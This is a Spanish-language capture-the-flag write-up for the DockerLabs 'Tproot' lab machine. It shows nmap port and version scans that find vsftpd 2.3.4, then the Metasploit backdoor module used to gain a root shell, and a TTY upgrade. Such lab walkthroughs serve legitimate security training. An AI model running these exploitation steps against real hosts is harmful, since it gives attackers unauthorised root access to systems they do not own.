#Maquina Tproot
----

Desplegamos la maquina Tproot de dockerlabs.

![image](https://github.com/user-attachments/assets/af103254-7ba7-4ac4-9622-873b8d05a414)


---- 

## Escaneo
Primero hacemos un escaneo de todos los puertos para ver los que están abiertos.

```bash
nmap -p- --open --min-rate 5000 -n -Pn 172.17.0.2 -vvv -oN allPorts.txt
```

- `-p-`: Indicamos que vas a escanear todo el rango de puertos
- `--open`: Indicamos que te muestre solo los puertos que estén abiertos.
- `--min-rate 5000`: Le indicamos a nmap que envie 5000 paquetes por segundo en el escaneo.
- `-n`: Quitamos la resolución DNS del escaneo.
- `-Pn`: Desactivamos la fase de host discobery, porque sabemos que el host esta activo y ademas nos da un poco mas de velocidad en el escaneo.
- `-vvv`: Añadimos verbose.
- `-oN`: Indicamos que nos saque un output del escaneo en formato nmap al archivo allPorts.txt.

![image](https://github.com/user-attachments/assets/beb43990-f502-4992-8ebe-a4b31a0147eb)


Tenemos abiertos los puertos 21 y 80. Vamos a hacer un escaneo de versiones de los servicios que corren en esos puertos.

```bash
nmap -p21,80 -sCV 172.17.0.2 -oN targeted.txt
```

- `-p21,80`: Indicamos que el escaneo se haga solo sobre esos 2 puertos.
- `-sCV`: Indicamos que queremos hacer un escaneo de las versiones que tienen los servicios corriendo en esos puertos y lanza unos scripts de reconocimiento que nos daran un poco mas de informacion sobre el servicio.

![image](https://github.com/user-attachments/assets/1b80d4e8-512e-4dd9-893e-d6e94d0c6ed0)

El escaneo nos muestra las versiones de los servicios que corren por los puertos y podemos ver que tenemos una version vulnerable del servicio ftp por el puerto 21 (vsftpd 2.3.4).

----

## Intrusion

Para la fase de intrusion vamos a usar metasploit.

```bash
msfconsole
```

Una vez en la consola de metasploit buscamos un exploit para la version de ftp del puerto 21 con el comando `search`.

```bash
search vsftpd 2.3.4
```

![image](https://github.com/user-attachments/assets/126b091b-55cf-47ef-9766-0b7b2428c15a)

Vemos que tenemos un exploit para esta version que nos dara un backdor, asique lo seleccionamos y lo configuramos.

```bash
use 0
show options
```

![image](https://github.com/user-attachments/assets/48e0c41b-c8e3-4234-8a29-388758534747)

Nos pide el Remote host. Se lo indicamos con el comando `set` y ya podriamos lanzar el exploit.

```bash
set RHOST 172.17.0.2
```

![image](https://github.com/user-attachments/assets/a195a8cd-a081-417f-afbc-dde02a86854d)

```bash
exploit
```

![image](https://github.com/user-attachments/assets/773bf394-c356-4741-b422-fd9892d1bf38)

Ya tendriamos acceso a la maquina victima con privilegios de root, pero se ve un poco mal y es complicado moverse con la terminal de esa manera. Vamos a hacer un tratamiento de la TTY para añadir un prompt y poder manejarnos mejor.

```bash
script /dev/null -c bash
export TERM=xterm
```

![image](https://github.com/user-attachments/assets/c0419483-20ba-4f19-80c4-e9e955e38e52)

